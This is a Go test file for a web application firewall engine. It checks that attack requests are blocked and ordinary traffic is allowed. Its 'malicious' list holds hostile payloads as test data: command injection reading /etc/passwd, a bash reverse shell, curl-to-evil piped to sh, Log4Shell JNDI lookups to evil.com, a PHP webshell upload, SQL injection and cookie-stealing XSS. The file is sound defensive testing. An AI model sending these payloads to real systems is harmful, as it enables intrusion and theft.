package engine

import (
	"net/netip"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/orcinustools/bima/internal/alert"
	"github.com/orcinustools/bima/internal/ban"
	"github.com/orcinustools/bima/internal/config"
	"github.com/orcinustools/bima/internal/detect"
	"github.com/orcinustools/bima/internal/enum"
	"github.com/orcinustools/bima/internal/store"
)

var testCRS *detect.CRS

func newEngine(t *testing.T, withCRS bool) *Engine {
	t.Helper()
	cfg := config.Default()
	cfg.Ban.Enabled = false
	st := store.NewMemory("")
	b, _ := ban.New(st, []string{"tcp:127.0.0.1:1"}, cfg.Ban.MapFile, []time.Duration{time.Minute}, false)
	var crs *detect.CRS
	if withCRS {
		if testCRS == nil {
			c, err := detect.NewCRS(1, 5, "", "")
			if err != nil {
				t.Fatal(err)
			}
			testCRS = c
		}
		crs = testCRS
	}
	return New(cfg, crs, enum.NewScorer(st, time.Minute, time.Minute, enum.DefaultThresholds), b, alert.New("test", time.Minute, time.Minute), nil)
}

var ipN = 1

func req(method, target string, headers map[string]string, body string) *Request {
	ipN++
	u, _ := url.Parse("http://x" + target)
	path := strings.SplitN(target, "?", 2)[0]
	r := &Request{IP: netip.AddrFrom4([4]byte{10, 0, byte(ipN >> 8), byte(ipN)}), Method: method, Path: path, Query: u.RawQuery, Version: "1.1", Body: []byte(body)}
	if headers == nil {
		headers = map[string]string{}
	}
	if _, ok := headers["User-Agent"]; !ok {
		headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130 Safari/537.36"
	}
	r.Headers = [][2]string{{"Host", "app.test"}, {"Accept", "*/*"}}
	if body != "" {
		r.Headers = append(r.Headers, [2]string{"Content-Length", strconv.Itoa(len(body))})
	}
	for k, v := range headers {
		r.Headers = append(r.Headers, [2]string{k, v})
	}
	return r
}

type tc struct {
	name, method, target, body string
	headers                    map[string]string
}

var malicious = []tc{
	{name: "cmdi semicolon", method: "GET", target: "/api/ping?host=127.0.0.1;cat%20/etc/passwd"},
	{name: "cmdi pipe", method: "GET", target: "/api/ping?host=x|id"},
	{name: "cmdi subshell", method: "GET", target: "/api/ping?host=$(whoami)"},
	{name: "cmdi backtick", method: "GET", target: "/api/ping?host=%60uname%20-a%60"},
	{name: "cmdi double-encoded", method: "GET", target: "/api/ping?host=1%253Bid"},
	{name: "cmdi quote obfuscation", method: "GET", target: "/api/ping?host=1;c''at+/etc/hosts"},
	{name: "cmdi IFS", method: "GET", target: "/api/ping?host=1;cat${IFS}/etc/hosts"},
	{name: "reverse shell", method: "POST", target: "/api/run", body: `{"cmd":"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}`, headers: map[string]string{"Content-Type": "application/json"}},
	{name: "curl pipe sh", method: "POST", target: "/api/hook", body: "url=http://evil/x.sh+|+sh&a=1", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}},
	{name: "base64 payload", method: "GET", target: "/api/x?d=" + "Y3VybCBodHRwOi8vZXZpbC94LnNoIHwgc2g="},
	{name: "php eval", method: "POST", target: "/index.php", body: "x=eval($_POST['c'])", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}},
	{name: "php wrapper", method: "GET", target: "/index.php?page=php://filter/convert.base64-encode/resource=index"},
	{name: "log4shell header", method: "GET", target: "/", headers: map[string]string{"X-Api-Version": "${jndi:ldap://evil.com/a}"}},
	{name: "log4shell obfuscated", method: "GET", target: "/", headers: map[string]string{"User-Agent": "${${lower:j}${upper:n}${::-d}i:ldap://evil.com/a}"}},
	{name: "spring4shell", method: "POST", target: "/greeting", body: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}},
	{name: "java deserialization", method: "POST", target: "/api/obj", body: "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ", headers: map[string]string{"Content-Type": "text/plain"}},
	{name: "ssti jinja", method: "GET", target: "/hello?name={{7*7}}"},
	{name: "ssti class", method: "GET", target: "/hello?name={{''.__class__.__mro__[1].__subclasses__()}}"},
	{name: "path traversal", method: "GET", target: "/download?file=../../../../etc/passwd"},
	{name: "path traversal encoded", method: "GET", target: "/static/..%252f..%252f..%252fetc%252fpasswd"},
	{name: "path traversal overlong", method: "GET", target: "/static/..%c0%af..%c0%afetc/shadow"},
	{name: "webshell upload", method: "POST", target: "/upload", body: "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\n<?php system($_GET[c]); ?>\r\n--b--", headers: map[string]string{"Content-Type": "multipart/form-data; boundary=b"}},
	{name: "sqli (CRS)", method: "GET", target: "/items?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"},
	{name: "xss (CRS)", method: "GET", target: "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"},
}

var benign = []tc{
	{name: "home", method: "GET", target: "/"},
	{name: "query with ampersands", method: "GET", target: "/api/users?id=5&sort=asc&page=2&limit=20"},
	{name: "json with punctuation", method: "POST", target: "/api/notes", body: `{"note":"hello; see you & bye | ok :) price 10*5=50","tags":["a","b"]}`, headers: map[string]string{"Content-Type": "application/json"}},
	{name: "form login", method: "POST", target: "/login", body: "email=user%40mail.com&password=S3cret%21%40%23&remember=on", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}},
	{name: "cookie header", method: "GET", target: "/dashboard", headers: map[string]string{"Cookie": "session=abc123; id=42; theme=dark"}},
	{name: "image upload", method: "POST", target: "/upload", body: "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"photo.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nJFIF....\r\n--b--", headers: map[string]string{"Content-Type": "multipart/form-data; boundary=b"}},
	{name: "search with words", method: "GET", target: "/search?q=how+to+cat+a+file+in+linux"},
	{name: "markdown body", method: "POST", target: "/api/posts", body: `{"body":"Use the command line. Then run tests and check the output."}`, headers: map[string]string{"Content-Type": "application/json"}},
	{name: "jwt bearer", method: "GET", target: "/api/me", headers: map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"}},
	{name: "dates and math", method: "GET", target: "/api/report?from=2026-01-01&to=2026-02-01&expr=a*b"},
}

func TestMalicious(t *testing.T) {
	e := newEngine(t, true)
	for _, c := range malicious {
		t.Run(c.name, func(t *testing.T) {
			v := e.OnRequest(req(c.method, c.target, c.headers, c.body))
			if v.Action != Block {
				t.Errorf("expected block, got %s (rule=%q score=%.0f)", v.Action, v.RuleID, v.Score)
			} else {
				t.Logf("blocked by %s", v.RuleID)
			}
		})
	}
}

func TestBenign(t *testing.T) {
	e := newEngine(t, true)
	for _, c := range benign {
		t.Run(c.name, func(t *testing.T) {
			v := e.OnRequest(req(c.method, c.target, c.headers, c.body))
			if v.Action != Allow {
				t.Errorf("false positive: %s by %s (score=%.0f)", v.Action, v.RuleID, v.Score)
			}
		})
	}
}

func TestEnumerationEscalates(t *testing.T) {
	e := newEngine(t, false)
	ip := netip.MustParseAddr("10.9.9.9")
	var last Verdict
	for i := 0; i < 45; i++ {
		r := &Request{IP: ip, Method: "GET", Path: "/random-" + string(rune('a'+i%26)) + strings.Repeat("x", i)}
		last = e.OnRequest(r)
		if last.Action == Block {
			break
		}
		e.OnResponse("", ip, netip.Addr{}, "GET", r.Path, 404, "")
	}
	if last.Action != Block {
		t.Fatalf("expected ban/block after 404 flood, got %s score=%.0f", last.Action, last.Score)
	}
}

func TestScannerUA(t *testing.T) {
	e := newEngine(t, false)
	v := e.OnRequest(req("GET", "/", map[string]string{"User-Agent": "sqlmap/1.8#stable (https://sqlmap.org)"}, ""))
	if v.Action != Tarpit {
		t.Fatalf("expected tarpit, got %s", v.Action)
	}
}

func TestDetectModeNeverBlocks(t *testing.T) {
	e := newEngine(t, false)
	e.cfg.Mode = config.ModeDetect
	v := e.OnRequest(req("GET", "/api/ping?host=;id", nil, ""))
	if v.Action != Allow || v.RuleID == "" {
		t.Fatalf("detect mode should allow but report rule, got %+v", v)
	}
}

func TestProtocolOnlyNotBlocked(t *testing.T) {
	e := newEngine(t, true)
	r := req("GET", "/api/users?id=8", map[string]string{"User-Agent": "hey/0.0.1"}, "")
	r.Headers = [][2]string{{"Host", "127.0.0.1:18080"}, {"User-Agent", "hey/0.0.1"}, {"Content-Type", "text/html"}}
	for i := 0; i < 10; i++ {
		if v := e.OnRequest(r); v.Action != Allow {
			t.Fatalf("request %d: protocol-only CRS hits must not block, got %s by %s", i, v.Action, v.RuleID)
		}
	}
}
